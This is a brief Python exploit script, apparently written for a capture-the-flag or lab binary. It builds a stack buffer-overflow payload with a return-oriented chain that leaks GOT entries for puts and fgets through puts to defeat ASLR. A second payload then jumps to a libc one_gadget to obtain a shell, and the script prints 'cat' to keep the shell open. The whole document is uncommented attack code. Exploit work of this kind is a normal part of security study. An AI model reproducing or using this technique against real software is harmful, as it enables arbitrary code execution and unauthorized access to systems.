from struct import pack
nops = '\x90'
padding = '\x00'
crashOffset = 72

ss = pack('Q', 0x4006f8)	# Original string printed by program
puts = pack('Q', 0x601018)  # 0x601018)#0x4006f8)
fgets = pack('Q', 0x601028)	# GOT Table Entries
poprdi = pack('Q', 0x4006d3)
putsret = pack('Q', 0x4004e0)
fflushret = pack('Q', 0x40063f)
mainret = pack('Q', 0x400626)

# 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
payload = nops*(crashOffset - 8) + pack('Q', 0x7fffffffd7e8) + \
    (poprdi + puts + putsret) + \
    (poprdi + fgets + putsret) + \
        \
    (poprdi + ss + putsret) + \
        \
    mainret

print(payload)

libc_base = 0x07ffff7db6000
one_gadget = pack('Q', 0xe666b + libc_base)

# 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
npayload = nops*(crashOffset - 8) + pack('Q', 0x7fffffffd7e8) + \
    one_gadget

print(npayload)
print("cat")